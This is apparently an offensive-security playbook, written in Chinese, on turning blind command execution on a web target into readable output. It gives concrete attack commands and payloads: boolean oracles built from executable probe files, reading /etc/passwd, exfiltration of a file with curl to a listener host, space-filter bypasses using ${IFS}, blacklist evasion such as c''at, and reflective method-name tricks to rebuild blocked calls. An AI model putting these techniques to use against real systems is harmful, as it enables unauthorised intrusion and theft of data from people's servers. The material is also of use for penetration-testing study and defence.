# 无回显执行：先证明「跑没跑」，再建「读回通道」

命令/代码执行拿不到输出，是最常见的卡点。**不要因为没回显就换漏洞**，
按下面四步走，绝大多数「盲执行」都能变成「有回显」。

## 一、先证明它真的执行了

| 证据类型 | 怎么看出来 | 说明 |
|---|---|---|
| **异常里的类名** | 报错文本出现 `ProcessImpl` / `UNIXProcess` / `subprocess.Popen` | 说明「命令对象被创建了」，**已经执行** |
| **状态码分裂** | 同一注入点：合法命令 → 4xx/200；不存在的命令 → 5xx（`No such attribute` / `not found`） | 执行器把「可执行文件不存在」当成求值失败，天然形成**存在性 oracle** |
| **副作用** | 写文件、建目录、改时间戳、占端口 | 只能通过「另一个渠道」观测，见第三节 |
| **连接** | 目标回连（反向 shell / 外带请求） | 需要目标有出网或被访问的路径 |

**陷阱**：很多执行器（`Runtime.exec`、`subprocess.Popen`）**不等待**子进程。
所以 `sleep 5` 不会让 HTTP 响应变慢 —— **时间盲测在这种场景下是假信号**，
不要用它判断成败；判断用状态码分裂或副作用。

## 二、把它改造成布尔 oracle

思路：让「条件成立」变成一个**可执行文件的存在性**，再用第一节的状态码分裂去读。

```
# 目标侧（一次注入里执行两条，不依赖回显）
test -e /path/we/want && cp /bin/true /tmp/p1     # 条件成立 → 造出一个「可执行」探针
# 观察侧（第二次注入）
/tmp/p1                                            # 能创建进程 = 条件成立；报「命令不存在」= 不成立
```

要点：
- 探针必须是**可执行文件**（`cp /bin/true`），`touch` 出来的普通文件会因权限被拒，永远返回「不成立」。
- 每条判断要用**新的探针名**，或先 `rm -f`，否则会被上一次的结果污染。
- 带上 `test -d` / `test -f` / `test -r` 就能做目录枚举与可读性判断；
  带 `grep -q` / `[ "$(cut -cN file)" = "X" ]` 就能逐字节读文件（慢，但是最后手段）。

## 三、写-读回环：找「应用自己的读通道」

比盲 oracle 快得多的做法：**把结果写进应用本来就会读的地方**，再用应用自己的接口取回。

优先级从高到低：

1. **静态资源目录**（`www/`、`static/`、`public/`、`assets/`）→ 直接 `GET /<文件名>`。
   注意 `www/` 这类映射常常指向**数据目录**而不是安装目录，先确认实际映射（请求一个已知文件看 404 还是 200）。
2. **应用自己的内容接口**：样式/SLD/模板/配置等「可 GET 回原文」的资源接口
   （先创建一个空资源拿到路径规律，再让命令覆盖同名文件，最后 GET 回读；服务端有缓存时先调一次 reload/重新加载）。
3. **用户数据 / 附件 / 草稿接口**：很多平台有「用户目录读写」接口（列目录、读文件、写文件），
   用它既能把 payload 写进去，也能把结果读出来，**一条 API 就够，不需要 getshell**。
4. **日志与错误页**：把结果写进应用日志，再从「后台日志页面」或错误堆栈里看。
5. **外带**：目标能出网时 `curl --data-binary @/path/to/file http://LISTENER/`；
   注意 `--data-binary @file` 不需要 shell，直接吃本地文件，最省事。

### 补充：容易被忽略的两条"窄通道"

- **异常/错误消息**：把命令输出塞进异常再抛出，框架会把异常文本渲染进响应
  （`raise Exception(<cmd 输出>)`、`throw new Exception('<cmd>'.execute().text)`），
  回显点常在 `function.errors[0]`、500 页、堆栈里。适合"有输出但正常字段不带出来"的实现。
- **响应头 / 重定向**：把结果拼进重定向目标或自定义头（如 `x-action-redirect` 的 digest）。
  注意这类头**只吃单行**，多行输出要先 `tr -d '\n'` 或 base64；换行会被直接丢弃，看着像"没执行"。
- **结构化字段**：很多实现只把结果放进某个固定路径（`result.data[0]`、`stdout`、`output`），
  先拿一条 `echo marker` 找到它落在哪个键，再换真命令。

## 四、无空格 / 被过滤时的构造技巧

执行器按空白切分参数（`Runtime.exec(String)` 用的就是 StringTokenizer），
或者过滤了空格/关键字时：

```
sh -c cat${IFS}/etc/passwd             # ${IFS} 展开成空格，整条仍是一个参数
sh -c cp${IFS}/a${IFS}/b               # 多段命令同理
cat /dir/*                             # 文件名不确定时用通配符，绕开「路径黑名单」
c''at /dir/*                           # 命令名被字面匹配拦截时：空引号/反斜杠/通配符破坏
/p?th/to/bin
```

- **引号破坏法**对「字面命令名黑名单」几乎总是有效：`c''at`、`c\at`、`c"a"t`、`/bin/c?t`。
  判断方法：`cat` 被拦而 `c''at` 通了 → 是字面匹配，不是真沙箱。
- **XML / 属性型注入点**：`&` 必须写成 `&amp;`，否则请求在解析层就废了
  （表现是「200 但什么都没发生」，很像「没执行成功」）。
- **XPath / 表达式型注入点**（如把用户串当 XPath 求值）：`$` 在表达式里是变量引用，
  但**放进字符串字面量里就是普通字符**，所以 `${IFS}` 这类写法要落在引号内。
- 方法名/函数名被过滤时，用等价反射：`invokeMethod('exe'+'cute')`、`"exe${'cute'}"()`、
  运行时求值（`Eval.me` / `eval` / `Function` 构造器）拼出被禁名字。

## 五、收尾检查

- 写入的文件是不是**以服务账号可读**？以 root 运行的服务 vs 普通用户，落点不同。
- 服务端有没有**缓存**（资源、配置、模板）？写了没生效先触发 reload / 重启，再读。
- 你读回的内容是不是**目标上真实存在**的（不要用推测内容去提交）。
